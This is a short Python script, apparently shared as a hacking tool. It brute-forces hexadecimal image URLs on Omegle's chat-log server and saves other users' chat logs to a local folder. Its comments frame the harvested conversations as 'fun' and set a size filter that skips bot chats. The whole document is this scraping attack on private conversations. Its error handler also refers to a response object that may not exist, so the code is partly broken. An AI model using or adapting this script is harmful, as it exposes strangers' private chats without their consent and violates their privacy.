###########################################################################
# Omegle-Chat_hack														  
# Made by - Indrajeet Bhuyan (www.hackatrick.com)						  
#																		  
#																		  
# Version: 0.1
# Date:    07-08-2016 (dd-mm-yyyy)
#
# Version 0.2
# Date:     19-08-2016
#
# This tool downloads random chat logs which are saved in omegle's server.
###########################################################################



import itertools
import urllib.request
import os

print("\t\t----------Omegle Chat Hack----------\n")

#Minimum image size to download
#Setting it by default to 100Kb
#1 . You won't get anything "fun" from chats which lasted few seconds
#2 . You can also skip the chat with bots using this simple filter
img_size = 102400

#Create directory under the name "omegle_images"
#as it is less likely to be present already
#You don't want to mess with your other images folder :P
path = "omegle_images"
if not os.path.exists(path):
	os.makedirs(path)		

#Base URL
url="http://l.omegle.com/"

#Number of images to download
numberofImagesWanted=int(input("Enter limit 10-500 : " ))

for j in range (0,numberofImagesWanted):
	stuff = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f" ]
	for L in range(5, 10):
			for i in itertools.combinations_with_replacement(stuff, L):

				finalurl=url+str(''.join(i))+".png"
				j+=1
				if j==numberofImagesWanted +1:
					exit(0)

				omRequest = urllib.request.Request(finalurl)
				try :
					req = urllib.request.urlopen(omRequest)
					if img_size > req.length:
						print('\n***** Skipping ', finalurl, ' of size ', int(req.length/1024), 'Kb')
						#Increment numberofImagesWanted so that skipping is accounted
						numberofImagesWanted+=1
						continue
					print('\n********** Downloading ', finalurl, ' of size ', int(req.length/1024), 'Kb')
					filename = os.path.join(path, str(''.join(i))+".png")
					output = open(filename,"wb")
					output.write(req.read())
					output.close()
				except  urllib.error.URLError as e:
					#Not Incrementing numberofImagesWanted to avoid looping endlessly
					print('\n*** Failed to download', finalurl, ' of size ', int(req.length/1024), 'Kb')


			

